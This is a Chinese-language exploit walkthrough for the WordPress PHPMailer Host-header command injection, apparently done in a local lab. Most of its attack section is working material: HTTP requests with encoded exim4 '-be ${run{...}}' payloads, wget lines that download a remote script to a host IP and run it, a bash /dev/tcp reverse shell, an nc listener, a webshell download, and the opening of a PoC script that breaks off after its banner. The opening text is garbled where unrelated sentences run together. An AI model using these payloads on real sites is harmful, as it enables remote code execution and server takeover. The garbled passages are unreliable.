# 漏洞信息
WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把
WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本  `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。
访问 [http://127.0.0.1:8000](http://127.0.0.1:8000/) 看到 WordPress 主界面代表启动成功
# 漏洞分析
漏洞页面：`/wp-login.php?action=lostpassword`
此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是`phpmailer Hostname)) {
                $result = $this->Hostname;
            } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
                $result = $_SERVER['SERVER_NAME'];
            } elseif (function_exists('gethostname') && gethostname() !== false) {
                $result = gethostname();
            } elseif (php_uname('n') !== false) {
                $result = php_uname('n');
            }
            return $result;
        }
`serverHostname`函数通过传入的`SERVER_NAME`参数来获取主机名，该主机名即HTTP请求报文中的host值，但是`SERVER_NAME`参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。
更棒的是，`sendmail` 提供了`-O`和`-X`参数，`-X`参数用于写入日志文件， 我们可以使用`-OQueueDirectory=/tmp/
-X/tmp/smtp.php`命令组合，它会将发送的邮件保存到`/tmp/smtp.php`中， 那么在请求的时候payload应该类似于这样：
    POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
    Host: aaa( -X/tmp/smtp.php )@qq.com
在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？
思路很好，然而现实很无奈。
  * wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考[链接](http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html)。
  * 比如我们想要调用`/bin/touch`的时候也会出问题，因为host字段中如果出现`/`，服务器会拒绝我们的请求。
因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！
正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道`ubuntu/debain`系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。
那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现`-be`参数
    Run Exim in expansion testing mode. Exim  discards  its  root
                     privilege,  to prevent ordinary users from using this mode to
                     read otherwise inaccessible files. If no arguments are given,
                     Exim  runs interactively, prompting for lines of data. Other‐
                     wise, it processes each argument in turn.
                     If Exim was built with USE_READLINE=yes in Local/Makefile, it
                     tries  to  load  the libreadline library dynamically whenever
                     the -be option is used without  command  line  arguments.  If
                     successful,  it  uses the readline() function, which provides
                     extensive line-editing facilities, for reading the test data.
                     A line history is supported.
                     Long expansion expressions can be split over several lines by
                     using backslash continuations. As in Exim's run time configu‐
                     ration,  white  space  at  the start of continuation lines is
                     ignored. Each argument or data line  is  passed  through  the
                     string  expansion  mechanism, and the result is output. Vari‐
                     able values from the configuration file (for example,  $qual‐
                     ify_domain)  are  available,  but  no message-specific values
                     (such as $message_exim_id) are set,  because  no  message  is
                     being processed (but see -bem and -Mset).
                     Note:  If  you  use  this  mechanism to test lookups, and you
                     change the data files or databases you are  using,  you  must
                     exit  and  restart  Exim before trying the same lookup again.
                     Otherwise, because each Exim process caches  the  results  of
                     lookups,  you will just get the same result as before.  Macro
                     processing is done  on  lines  before  string-expansion:  new
                     macros  can  be defined and macros will be expanded.  Because
                     macros in the config file are often used for  secrets,  those
                     are only available to admin users.
简单来说，`-be`参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，`$tod_log`，它可以显示系统时间。
    ~$ sendmail -be '$tod_log'
    2018-04-20 16:26:47
并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数`substr`、`$run`系统调用函数。
我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。
那么同理，我们也可以截取`/`字符串：
我们测试使用`$run`函数调用系统命令
到这里，遇到的问题都解决了，我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：
    aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null)
> 空格 ==> ${substr{10}{1}{$tod_log}}
>
> / ==> ${substr{0}{1}{$spool_directory}}
转换过来就是
    aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)
我们去密码重置页面输入重置用户名为admin，提交之后拦截请求，并把host的值修改为我们的payload：
    POST /wp-login.php?action=lostpassword HTTP/1.1
    Host: aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://172.16.176.128:8000/wp-login.php?action=lostpassword
    Cookie: wordpress_test_cookie=WP+Cookie+check
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 63
    user_login=admin&redirect_to=&wp-submit=Get+New+Password
提交请求：
在/tmp目录下发现成功生成了测试文件。
### 执行任意命令
实际上我们按照刚才的思路，替换我们想要执行的命令即可。但实际利用起来，还是有些需要注意的地方：
  * 执行的命令不能包含大量特殊字符，如 `:`、引号等。
  * 命令会被转换成小写字母
  * 命令需要使用绝对路径
  * 需要知道某一个存在的用户的用户名
### 写入shell
#### 反弹shell
思路是利用`curl`或者`wget`命令下载远程文件。这里我测试下载执行一个反弹bash脚本。需要注意的地方：
  * 远程 URL 中不能有 `http://`
  * 所有字母必须小写
​
远程反弹shell脚本：`172.16.176.1:8080/a.txt`，内容：
    nohup bash -i >/dev/tcp/172.16.176.1/1337 0&1) &
payload：
    aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce 172.16.176.1/a.txt}} null)
执行反弹shell：
    aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)
两个payload转换过来就是
    aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}172.16.176.1${substr{0}{1}{$spool_directory}}a.txt}} null)
    aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)
在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell
    nc -nvv -l -p 1337
#### 写入一句话webshell
同理，可以直接下载一句话webshell，然后菜刀连接。payload：
payload：
    aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document a.php 172.16.176.1/a.txt}} null)
转换过来即
    aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}a.php${substr{10}{1}{$tod_log}}172.16.176.1${substr{0}{1}{$spool_directory}}a.txt}} null)
### POC
自动化提交payload，获取反弹shell。通过`python -mSimpleHTTPServer
80`建立web服务，用于目标下载shell。运行是需要用管理员权限，因为监听了80端口。
使用方法
    sudo ./wordpress-rce-exploit.sh http://172.16.176.128:8000
    #!/bin/bash
    #
    #      __                     __   __  __           __
    #     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
    #    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
    #   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
    #  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
    #            /____/